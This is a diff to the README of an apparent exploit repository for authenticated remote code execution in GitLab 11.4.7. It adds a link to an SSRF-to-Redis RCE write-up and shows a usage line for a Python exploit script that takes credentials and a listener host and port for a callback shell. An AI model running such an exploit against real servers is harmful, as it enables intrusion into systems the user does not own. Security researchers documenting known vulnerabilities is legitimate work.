@@ -1,5 +1,7 @@
 # GitLab-11.4.7-Authenticated-Remote-Code-Execution
 
+<h4> Blog : https://github.com/jas502n/gitlab-SSRF-redis-RCE/blob/master/README.md </h4>
+
 
 <h3> Usage : python gitlab_rce.py -U `USERNAME` -P `PASSWORD` -l `LHOST` -p `LPORT` </h3>
   
